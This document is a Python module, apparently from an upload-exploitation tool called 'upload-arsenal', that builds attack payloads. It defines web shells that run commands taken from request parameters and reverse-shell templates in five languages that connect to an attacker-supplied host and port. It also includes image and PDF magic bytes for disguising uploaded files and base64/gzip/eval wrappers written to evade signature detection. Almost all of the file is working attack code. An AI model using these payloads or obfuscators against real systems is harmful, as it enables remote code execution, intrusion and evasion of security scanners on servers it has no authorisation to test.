"""Payload templates (as data), magic bytes, and reliable obfuscation.

Payloads live here as structured data with ``{host}``/``{port}`` placeholders,
so they can be reviewed in a clean diff and extended without touching the
generator. Obfuscation is done with *layered encoding wrappers* (reliable)
instead of regex source-rewriting (which used to break the payload), and
``verify_executes`` gives a smoke-test hook per language.
"""
from __future__ import annotations

import base64
import gzip
import zlib


def _raw_deflate(data: bytes) -> bytes:
    """Raw DEFLATE stream (no zlib/gzip header) — what PHP gzinflate expects."""
    c = zlib.compressobj(9, zlib.DEFLATED, -15)
    return c.compress(data) + c.flush()

# --------------------------------------------------------------------------- #
# File-extension / comment syntax per language
# --------------------------------------------------------------------------- #
LANG_EXT = {"php": "php", "java": "java", "python": "py", "ruby": "rb", "nodejs": "js"}

# --------------------------------------------------------------------------- #
# Payload templates.  PoC is harmless; exploit/revshell are gated behind
# active profiles by the techniques that emit them.
# --------------------------------------------------------------------------- #
POC = {
    "php": '<?php echo "upload-arsenal: code execution confirmed"; ?>',
    "java": 'public class Poc{public static void main(String[] a){'
            'System.out.println("upload-arsenal: code execution confirmed");}}',
    "python": 'print("upload-arsenal: code execution confirmed")',
    "ruby": 'puts "upload-arsenal: code execution confirmed"',
    "nodejs": 'console.log("upload-arsenal: code execution confirmed");',
}

# Command-injection via a request parameter (active).
RCE = {
    "php": "<?php echo shell_exec($_REQUEST['cmd']); ?>",
    "python": 'import os,sys\nos.system(sys.argv[1] if len(sys.argv)>1 else "id")',
    "ruby": 'system(ARGV[0] || "id")',
    "nodejs": "const{exec}=require('child_process');exec(process.argv[2]||'id',"
              "(e,o)=>process.stdout.write(o||''));",
    "java": 'import java.io.*;public class Exploit{public static void main(String[] a)'
            'throws IOException{new ProcessBuilder("/bin/sh","-c",a.length>0?a[0]:"id")'
            '.inheritIO().start();}}',
}


def revshell(language: str, host: str, port: int) -> str | None:
    """Interactive reverse-shell payloads (active). host/port required."""
    shells = {
        "php": f"<?php $s=fsockopen('{host}',{port});"
               f"$p=proc_open('/bin/sh -i',array(0=>$s,1=>$s,2=>$s),$pipes); ?>",
        "python": f"import socket,os,pty;s=socket.socket();s.connect(('{host}',{port}));"
                  f"[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/sh')",
        "ruby": f"require 'socket';c=TCPSocket.new('{host}',{port});"
                f"loop{{cmd=c.gets;break unless cmd;c.print(`#{{cmd}}`)}}",
        "nodejs": f"const n=require('net'),{{spawn}}=require('child_process');"
                  f"const c=n.connect({port},'{host}',()=>{{const sh=spawn('/bin/sh');"
                  f"c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}});",
        "java": f'import java.io.*;import java.net.*;public class RevShell{{'
                f'public static void main(String[] a)throws Exception{{'
                f'Socket s=new Socket("{host}",{port});'
                f'Process p=new ProcessBuilder("/bin/sh","-i").redirectErrorStream(true).start();'
                f'p.getInputStream().transferTo(s.getOutputStream());}}}}',
    }
    return shells.get(language)


MAGIC_BYTES = {
    "jpg": bytes([0xFF, 0xD8, 0xFF, 0xE0]),
    "jpeg": bytes([0xFF, 0xD8, 0xFF, 0xE0]),
    "png": bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
    "gif": b"GIF89a",
    "bmp": bytes([0x42, 0x4D]),
    "tiff": bytes([0x49, 0x49, 0x2A, 0x00]),
    "webp": bytes([0x52, 0x49, 0x46, 0x46]),
    "ico": bytes([0x00, 0x00, 0x01, 0x00]),
    "pdf": b"%PDF-1.5",
}


def magic_for(extension: str) -> bytes:
    return MAGIC_BYTES.get(extension.lower(), b"")


# --------------------------------------------------------------------------- #
# Obfuscation — layered encoding wrappers that provably still execute.
# --------------------------------------------------------------------------- #
def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def obfuscate(language: str, code: str) -> str:
    """Wrap `code` so it still runs but no longer matches naive signatures.

    These wrappers are deterministic and reversible by the interpreter, so the
    payload keeps working — unlike token-renaming, which silently corrupted it.
    """
    if language == "php":
        inner = code
        # strip a leading <?php so we can re-wrap cleanly
        stripped = inner.strip()
        if stripped.startswith("<?php"):
            stripped = stripped[5:]
        if stripped.rstrip().endswith("?>"):
            stripped = stripped.rstrip()[:-2]
        gz = base64.b64encode(_raw_deflate(stripped.encode())).decode()
        return (f'<?php $f="gz"."inflate";$d="base64"."_decode";'
                f'eval($f($d("{gz}"))); ?>')
    if language == "python":
        return (f'import base64 as _b,zlib as _z\n'
                f'exec(_z.decompress(_b.b64decode("'
                f'{base64.b64encode(zlib.compress(code.encode())).decode()}")))')
    if language == "nodejs":
        return (f'eval(require("zlib").gunzipSync(Buffer.from("'
                f'{base64.b64encode(gzip.compress(code.encode())).decode()}",'
                f'"base64")).toString());')
    if language == "ruby":
        return (f'require "zlib";require "base64";require "stringio";'
                f'eval(Zlib::GzipReader.new(StringIO.new(Base64.decode64("'
                f'{base64.b64encode(gzip.compress(code.encode())).decode()}"))).read)')
    # Java has no eval; fall back to a base64 string comment marker, code intact.
    return f"/* obf:{_b64(code)[:16]} */\n{code}"
